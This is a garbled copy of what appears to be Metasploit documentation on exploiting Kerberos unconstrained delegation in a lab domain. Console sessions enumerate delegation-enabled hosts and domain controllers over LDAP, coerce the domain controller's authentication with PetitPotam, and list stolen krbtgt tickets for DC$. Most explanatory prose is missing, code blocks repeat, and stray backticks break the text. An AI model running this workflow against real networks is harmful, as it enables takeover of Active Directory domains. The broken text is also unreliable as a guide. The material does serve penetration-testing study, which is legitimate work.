# Unconstrained Delegation Exploitation
## Lab setup
## Attack Workflow
### Target Identification
Use the `ENUM_UNCONSTRAINED_DELEGATION` action to enumerate targets:
```
msf6 > use auxiliary/gather/ldap_query
msf6 auxiliary(gather/ldap_query) > set RHOSTS 192.168.159.10
RHOSTS => 192.168.159.10
msf6 auxiliary(gather/ldap_query) > set DOMAIN msflab.local
DOMAIN => msflab.local
msf6 auxiliary(gather/ldap_query) > set USERNAME aliddle
USERNAME => aliddle
msf6 auxiliary(gather/ldap_query) > set PASSWORD Password1!
PASSWORD => Password1!
msf6 auxiliary(gather/ldap_query) > set ACTION ENUM_UNCONSTRAINED_DELEGATION 
ACTION => ENUM_UNCONSTRAINED_DELEGATION
msf6 auxiliary(gather/ldap_query) > run
[*] Running module against 192.168.159.10

[*] Discovering base DN automatically
[+] 192.168.159.10:389 Discovered base DN: DC=msflab,DC=local
[+] 192.168.159.10:389 Discovered schema DN: DC=msflab,DC=local
CN=WS01 CN=Computers DC=msflab DC=local
=======================================

 Name            Attributes
 ----            ----------
 cn              WS01
 objectcategory  CN=Computer,CN=Schema,CN=Configuration,DC=msflab,DC=local
 samaccountname  WS01$

CN=DC OU=Domain Controllers DC=msflab DC=local
==============================================

 Name            Attributes
 ----            ----------
 cn              DC
 memberof        CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=msflab,DC=local || CN=Cert Publishers,CN=Users,DC=msflab,DC=local
 objectcategory  CN=Computer,CN=Schema,CN=Configuration,DC=msflab,DC=local
 samaccountname  DC$

[*] Auxiliary module execution completed
msf6 auxiliary(gather/ldap_query) > 
```

domain controllers to remove from the list of potential targets.
```
msf6 auxiliary(gather/ldap_query) > set ACTION ENUM_DOMAIN_CONTROLLERS 
ACTION => ENUM_DOMAIN_CONTROLLERS
msf6 auxiliary(gather/ldap_query) > run
[*] Running module against 192.168.159.10

[*] Discovering base DN automatically
[+] 192.168.159.10:389 Discovered base DN: DC=msflab,DC=local
[+] 192.168.159.10:389 Discovered schema DN: DC=msflab,DC=local
CN=DC OU=Domain Controllers DC=msflab DC=local
==============================================

 Name                    Attributes
 ----                    ----------
 distinguishedname       CN=DC,OU=Domain Controllers,DC=msflab,DC=local
 dnshostname             DC.msflab.local
 name                    DC
 operatingsystem         Windows Server 2019 Standard
 operatingsystemversion  10.0 (17763)

[*] Auxiliary module execution completed
msf6 auxiliary(gather/ldap_query) >
```

### Exploitation
compromised domain account.
```
msf6 > use auxiliary/scanner/dcerpc/petitpotam 
msf6 auxiliary(scanner/dcerpc/petitpotam) > set LISTENER ws01.msflab.local
LISTENER => ws01.msflab.local
msf6 auxiliary(scanner/dcerpc/petitpotam) > set SMBUser aliddle
SMBUser => aliddle
msf6 auxiliary(scanner/dcerpc/petitpotam) > set SMBPass Password1!
SMBPass => Password1!
msf6 auxiliary(scanner/dcerpc/petitpotam) > set RHOSTS 192.168.159.10
RHOSTS => 192.168.159.10
msf6 auxiliary(scanner/dcerpc/petitpotam) > run

[+] 192.168.159.10:445    - Server responded with ERROR_BAD_NETPATH which indicates that the attack was successful
[*] 192.168.159.10:445    - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/dcerpc/petitpotam) >
```

computer account.
```
msf6 post(windows/manage/kerberos_tickets) > klist
Kerberos Cache
==============
id   host            principal               sname                             issued                     status  path
--   ----            ---------               -----                             ------                     ------  ----
411  192.168.159.10  DC$@MSFLAB.LOCAL        krbtgt/MSFLAB.LOCAL@MSFLAB.LOCAL  2023-08-23 09:32:46 -0400  active  /home/smcintyre/.msf4/loot/20230823151744_default_192.168.159.10_mit.kerberos.cca_307418.bin
407  192.168.159.10  WS01$@MSFLAB.LOCAL      krbtgt/MSFLAB.LOCAL@MSFLAB.LOCAL  2023-08-23 15:14:46 -0400  active  /home/smcintyre/.msf4/loot/20230823151735_default_192.168.159.10_mit.kerberos.cca_760842.bin

msf6 post(windows/manage/kerberos_tickets) > 
```

`userAccountControl`

`
msf6 > use auxiliary/gather/ldap_query
msf6 auxiliary(gather/ldap_query) > set RHOSTS 192.168.159.10
RHOSTS => 192.168.159.10
msf6 auxiliary(gather/ldap_query) > set DOMAIN msflab.local
DOMAIN => msflab.local
msf6 auxiliary(gather/ldap_query) > set USERNAME aliddle
USERNAME => aliddle
msf6 auxiliary(gather/ldap_query) > set PASSWORD Password1!
PASSWORD => Password1!
msf6 auxiliary(gather/ldap_query) > set ACTION ENUM_UNCONSTRAINED_DELEGATION 
ACTION => ENUM_UNCONSTRAINED_DELEGATION
msf6 auxiliary(gather/ldap_query) > run
[*] Running module against 192.168.159.10

[*] Discovering base DN automatically
[+] 192.168.159.10:389 Discovered base DN: DC=msflab,DC=local
[+] 192.168.159.10:389 Discovered schema DN: DC=msflab,DC=local
CN=WS01 CN=Computers DC=msflab DC=local
=======================================

 Name            Attributes
 ----            ----------
 cn              WS01
 objectcategory  CN=Computer,CN=Schema,CN=Configuration,DC=msflab,DC=local
 samaccountname  WS01$

CN=DC OU=Domain Controllers DC=msflab DC=local
==============================================

 Name            Attributes
 ----            ----------
 cn              DC
 memberof        CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=msflab,DC=local || CN=Cert Publishers,CN=Users,DC=msflab,DC=local
 objectcategory  CN=Computer,CN=Schema,CN=Configuration,DC=msflab,DC=local
 samaccountname  DC$

[*] Auxiliary module execution completed
msf6 auxiliary(gather/ldap_query) > 
`

`
msf6 auxiliary(gather/ldap_query) > set ACTION ENUM_DOMAIN_CONTROLLERS 
ACTION => ENUM_DOMAIN_CONTROLLERS
msf6 auxiliary(gather/ldap_query) > run
[*] Running module against 192.168.159.10

[*] Discovering base DN automatically
[+] 192.168.159.10:389 Discovered base DN: DC=msflab,DC=local
[+] 192.168.159.10:389 Discovered schema DN: DC=msflab,DC=local
CN=DC OU=Domain Controllers DC=msflab DC=local
==============================================

 Name                    Attributes
 ----                    ----------
 distinguishedname       CN=DC,OU=Domain Controllers,DC=msflab,DC=local
 dnshostname             DC.msflab.local
 name                    DC
 operatingsystem         Windows Server 2019 Standard
 operatingsystemversion  10.0 (17763)

[*] Auxiliary module execution completed
msf6 auxiliary(gather/ldap_query) >
`

`
msf6 > use auxiliary/scanner/dcerpc/petitpotam 
msf6 auxiliary(scanner/dcerpc/petitpotam) > set LISTENER ws01.msflab.local
LISTENER => ws01.msflab.local
msf6 auxiliary(scanner/dcerpc/petitpotam) > set SMBUser aliddle
SMBUser => aliddle
msf6 auxiliary(scanner/dcerpc/petitpotam) > set SMBPass Password1!
SMBPass => Password1!
msf6 auxiliary(scanner/dcerpc/petitpotam) > set RHOSTS 192.168.159.10
RHOSTS => 192.168.159.10
msf6 auxiliary(scanner/dcerpc/petitpotam) > run

[+] 192.168.159.10:445    - Server responded with ERROR_BAD_NETPATH which indicates that the attack was successful
[*] 192.168.159.10:445    - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/dcerpc/petitpotam) >
`

`

If the module does not indicate that the attack was successful, another tool like
[`

`](https://github.com/p0dalirius/Coercer) can be used to try additional methods.

Now that the domain controller has authenticated to the target it's necessary to dump the kerberos tickets from the
compromised target. Use the `

`
msf6 post(windows/manage/kerberos_tickets) > klist
Kerberos Cache
==============
id   host            principal               sname                             issued                     status  path
--   ----            ---------               -----                             ------                     ------  ----
411  192.168.159.10  DC$@MSFLAB.LOCAL        krbtgt/MSFLAB.LOCAL@MSFLAB.LOCAL  2023-08-23 09:32:46 -0400  active  /home/smcintyre/.msf4/loot/20230823151744_default_192.168.159.10_mit.kerberos.cca_307418.bin
407  192.168.159.10  WS01$@MSFLAB.LOCAL      krbtgt/MSFLAB.LOCAL@MSFLAB.LOCAL  2023-08-23 15:14:46 -0400  active  /home/smcintyre/.msf4/loot/20230823151735_default_192.168.159.10_mit.kerberos.cca_760842.bin

msf6 post(windows/manage/kerberos_tickets) > 
`

